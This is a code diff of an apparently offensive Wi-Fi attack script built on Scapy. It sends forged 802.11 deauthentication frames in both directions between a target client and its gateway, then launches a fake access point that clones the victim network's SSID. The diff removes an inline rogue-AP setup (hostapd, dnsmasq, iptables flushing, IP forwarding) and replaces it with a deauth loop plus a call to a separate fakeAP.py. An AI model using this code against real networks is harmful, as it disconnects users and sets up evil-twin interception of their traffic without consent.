@@ -68,67 +68,6 @@ def for_client(frame, interface):
   while True:
     sendp(frame, iface = interface, count = 100, inter = 0.1)
 
-def openAP(net,target_mac,interface):
-    # Source: https://hakin9.org/create-a-fake-access-point-by-anastasis-vasileiadis/
-
-    # os.system("service apache2 start")
-    # 1
-    os.system("sudo apt-get update")
-    # 2
-    os.system("sudo apt-get install hostapd dnsmasq")
-
-    # for clear port 53
-    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
-    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')
-    # 3
-    # 5
-    conf_text = f"interface={interface}\ndriver=nl80211\nssid={net['SSID']+'-check'}\nhw_mode=g"\
-    f"\nchannel={net['Channel']}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"\
-    "auth_algs=1\nieee80211n=1\nwme_enabled=1"
-    conf_file = open("hostapd.conf", "w")
-    n = conf_file.write(conf_text)
-    conf_file.close()
-
-    # 6
-    os.system("hostapd hostapd.conf")
-
-    # 7
-    conf_text = f"interface={interface}\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h"\
-    "\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1"\
-    "\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1"
-    conf_file = open("dnsmasq.conf", "w")
-    n = conf_file.write(conf_text)
-    conf_file.close()
-
-    # 8
-    os.system(f"ifconfig {interface} up 192.168.1.1 netmask 255.255.255.0")
-    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
-    os.system("dnsmasq -C dnsmasq.conf -d")
-
-    # 9
-    # os.system(f"iptables --table nat --append POSTROUTING -out-interface {interface} -j MASQUERADE")
-    # os.system(f"iptables --append FORWARD --in-interface {interface} -j ACCEPT")
-    os.system('iptables --flush')
-    os.system('iptables --table nat --flush')
-    os.system('iptables --delete-chain')
-    os.system('iptables --table nat --delete-chain')
-    os.system('iptables -P FORWARD ACCEPT')
-
-    # 10
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
-   	# ### Enable and start the local DNS stub listener that uses port 53 
-    os.system("systemctl enable systemd-resolved.service >/dev/null 2>&1") 
-    os.system("systemctl start systemd-resolved >/dev/null 2>&1") 
-
-    
-
-
-
-
-
-
-    return 0
 
 if __name__ == "__main__":
 
@@ -214,21 +153,33 @@ if __name__ == "__main__":
     # 11. User attack
     print('The target is: ', target_mac)
     print('Attack!!! :)')
-    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=1)
-    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=1)
+    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
+    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
     deauth1 = threading.Thread(target = for_ap, args = (frame, interface))
     deauth2 = threading.Thread(target = for_client, args = (frame1, interface))
-    newAP = threading.Thread(target = openAP, args = (net, target_mac, interface))
-    deauth1.start()
-    deauth2.start()
-    newAP.start()
-    deauth1.join()
-    deauth2.join()
-    newAP.join()
 
+    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
+    net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface+';"$SHELL'
+    print(fake_ap_cmd)
+
+    # Deauth
+    for i in range(200):
+        print("sending AP to client")
+        sendp(frame1, iface = interface)
+        print("sending client to AP")
+        sendp(frame, iface = interface)
+
+    # Fake AP
+    os.system(fake_ap_cmd)
+
+
+    # deauth1.start()
+    # deauth2.start()
+    # deauth1.join()
+    # deauth2.join()
 
 
     # 12. Disable monitor mode
-    os.system(f'sudo ifconfig {interface} down')
-    os.system(f'sudo iwconfig {interface} mode managed')
-    os.system(f'sudo ifconfig {interface} up')
+    # os.system(f'sudo ifconfig {interface} down')
+    # os.system(f'sudo iwconfig {interface} mode managed')
+    # os.system(f'sudo ifconfig {interface} up')
